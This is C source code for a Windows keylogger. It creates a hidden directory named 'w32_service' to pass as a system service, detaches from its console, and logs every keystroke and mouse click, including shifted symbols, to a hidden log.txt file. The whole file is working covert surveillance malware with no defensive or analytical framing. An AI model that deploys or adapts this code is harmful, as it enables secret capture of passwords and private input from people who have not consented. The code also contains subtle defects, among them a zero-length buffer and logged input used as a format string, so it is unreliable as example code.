#include<Windows.h>
#include<stdio.h>
/*
	Function which creates a Hidden Directory C:\w32_service
	Also creates a hidden log file named - log.txt
*/
int create_hidden_file()
{
	if(CreateDirectoryA("C:\\w32_service",NULL))
	{
		if(SetFileAttributesA("C:\\w32_service",FILE_ATTRIBUTE_HIDDEN))
		{
			FILE *file;
			file = fopen("C:\\w32_service\\log.txt","w");
			fputs("---------------------INITIALISED-----------------------\n",file);
			fclose(file);
			if(SetFileAttributesA("C:\\w32_service\\log.txt",FILE_ATTRIBUTE_HIDDEN))
			{
				return 1;
			}
		}
	}
	return 0;
}
/*
	Function which takes the keystroke and logs it into the file
	File location - C:\w32_service\log.txt
	w32_service - hidden folder
	log.txt = hidden file
*/
void log_data(char data[])
{
    FILE *file;
    file = fopen("C:\\w32_service\\log.txt", "a+");
    fprintf(file, data);
    fclose(file);
}
/*
	Checks if [CAPS LOCK] is ON/OFF
	ON	=> Returns 1
	OFF	=> Returns 0
*/
int checkCaps()
{
	int isCapsOn = GetKeyState(VK_CAPITAL);
	return isCapsOn;
}
/*
	Checks if Shift is Pressed
	Pressed		=> Returns 1
	Not Pressed	=> Returns 0
*/
int checkShift()
{
	int isShiftOn = GetKeyState(VK_SHIFT);
	if(isShiftOn==-127 || isShiftOn==-128)
	{
		return 1;
	}
	else
	{
		return 0;
	}
}
/*
	MAIN FUNCTION
*/
int main()
{
	int j=0;
	char input[0];
	// Check if the log file is already been created and exists
	if(!fopen("C:\\w32_service\\log.txt","r"))
	{
		//Create log file and hidden folder if doesn't exist
		int success = create_hidden_file();
		if(success==0)
		{
			//In case there is an error in creation of log file -> Exit the code
			return 0;
		}
	}
	FreeConsole();
	while(1)
    	{
        	for(int i=0; i<256; i++)
        	{
			if(GetAsyncKeyState(i)==-32767)
            		{
                		switch(i)
                		{
					case 0x01:
					log_data("[LEFT MOUSE]");
					break;
					
					case 0x02:
					log_data("[RIGHT MOUSE]");
					break;
					
                    			case 0x08:
                    			log_data("[BACK]");
                    			break;
					
					case 0x09:
					log_data("[TAB]");
					break;
					
					case 0x0D:
                    			log_data("\n");
                    			break;
					
					case 0x11:
					log_data("[CRTL]");
					break;
					
					case 0x12:
					log_data("[ALT]");
					break;
					
					case 0x1B:
					log_data("[ESC]");
					break;
					
					case 0x20:
                    			log_data(" ");
                    			break;
					
					case 0x2E:
                    			log_data("[DEL]");
                    			break;
					
					case 0x30:
					if(checkShift()==1){log_data(")");}
					else{log_data("0");}
					break;
					
					case 0x31:
					if(checkShift()==1){log_data("!");}
					else{log_data("1");}
					break;
					
					case 0x32:
					if(checkShift()==1){log_data("@");}
					else{log_data("2");}
					break;
					
					case 0x33:
					if(checkShift()==1){log_data("#");}
					else{log_data("3");}
					break;
					
					case 0x34:
					if(checkShift()==1){log_data("$");}
					else{log_data("4");}
					break;
					
					case 0x35:
					if(checkShift()==1){log_data("%");}
					else{log_data("5");}
					break;
					
					case 0x36:
					if(checkShift()==1){log_data("^");}
					else{log_data("6");}
					break;
					
					case 0x37:
					if(checkShift()==1){log_data("&");}
					else{log_data("7");}
					break;
					
					case 0x38:
					if(checkShift()==1){log_data("*");}
					else{log_data("8");}
					break;
					
					case 0x39:
					if(checkShift()==1){log_data("(");}
					else{log_data("9");}
					break;
					
					case 0xBD:
					if(checkShift()==1){log_data("_");}
					else{log_data("-");}
					break;
					
					case 0xBB:
					if(checkShift()==1){log_data("+");}
					else{log_data("=");}
					break;
					
					case 0xDB:
					if(checkShift()==1){log_data("{");}
					else{log_data("[");}
					break;
					
					case 0xDD:
					if(checkShift()==1){log_data("}");}
					else{log_data("]");}
					break;
					
					case 0xDC:
					if(checkShift()==1){log_data("|");}
					else{log_data("\\");}
					break;
					
					case 0xBA:
					if(checkShift()==1){log_data(":");}
					else{log_data(";");}
					break;
					
					case 0xDE:
					if(checkShift()==1){log_data("\"");}
					else{log_data("\'");}
					break;
					
					case 0xBC:
					if(checkShift()==1){log_data("<");}
					else{log_data(",");}
					break;
					
					case 0xBE:
					if(checkShift()==1){log_data(">");}
					else{log_data(".");}
					break;
					
					case 0xBF:
					if(checkShift()==1){log_data("?");}
					else{log_data("/");}
					break;
					
					case 0xC0:
					if(checkShift()==1){log_data("~");}
					else{log_data("`");}
					break;

                    			default:
					if(i>=65 && i<=90)
					{
						if(checkCaps()==1)
						{
							if(checkShift()==1)
							{
								j = i+32;
								input[0] = (char)j;
							}
							else
							{
								input[0] = (char)i;
							}
						}
						else
						{
							if(checkShift()==1)
							{
								input[0] = (char)i;
							}
							else
							{
								j = i+32;
								input[0] = (char)j;
							}
						}
						log_data(input);
					}
                    			break;
                		}
            		}
        	}
    	}
    	return 0;
}
